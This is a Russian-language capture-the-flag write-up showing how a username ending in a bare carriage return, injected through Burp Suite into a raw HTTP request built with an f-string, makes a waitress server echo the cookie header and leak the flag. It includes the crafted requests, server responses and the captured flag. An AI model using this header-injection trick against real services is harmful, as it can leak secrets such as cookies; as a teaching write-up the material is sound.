Проанализируем исходный код. Когда пользователь авторизован, делается запрос на второй сервер в функции make_request, туда мы отправляем наш никнейм и флаг в cookies.
Для формирования запроса используется обычная f-строка, в которую вставляется наш username, соответственно в username можно вставлять потенциально вредоносные строчки.
После этого мы получаем ответ от второго сервера, который возвращает Hello, {username} если флаг совпал или I don't trust you если флаг не совпал.

Воспользуемся программой Burpsuite. Сначала скопируем запрос который отправляется на 2 сервер, и попробуем его повторить, вставив случайный логин и флаг.
Например:
```
GET / HTTP/1.1\r\nHost: 0.0.0.0:3001\r\nCookie: username=abc;flag=abc\r\n\r\n
```

Мы получаем обычный ответ:
```HTTP/1.1 200 OK
Content-Length: 18
Content-Type: text/html; charset=utf-8
Date: Thu, 23 Mar 2023 12:59:24 GMT
Server: waitress

I don't trust you!
```

В запросах для переноса строки используется \r\n. Мы можем испортить запрос, вставив в юзернейм \r (без \n, тогда будет ошибка плохого переноса)
Отправим такой запрос на сервер, и получаем ответ:
```HTTP/1.0 400 Bad Request
Connection: close
Content-Length: 109
Content-Type: text/plain; charset=utf-8
Date: Thu, 23 Mar 2023 13:01:04 GMT
Server: waitress

Bad Request

Bare CR or LF found in header line "Cookie: username=abc
;flag=abc"

(generated by waitress)
```
Мы видим, что сервер нам отправил ошибку, и при этом вставил часть запроса, вместе с флагом, который мы отправляли.

Теперь нам нужно зарегистрировать любого пользователя и добавить в конце юзернейма \r.
Мы не можем зарегистрировать его через обычную форму авторизации, так как тогда \r посчитается как два символа: слэш и r, а не перенос каретки.
Перехватим с помощью Burpsuite запрос регистрации, отправим его в Repeater, отредактируем в нем логин например на abc\r и снова отправим на сервер. Затем мы получим сессию, зайдем под ней
в браузер, и получим такой ответ:
```
Bad Request Bare CR or LF found in header line "Cookie: username=abc ;flag=NTO{request_smuggling_917a34072663f9c8beea3b45e8f129c5}" (generated by waitress)
```
Здесь и найдем флаг.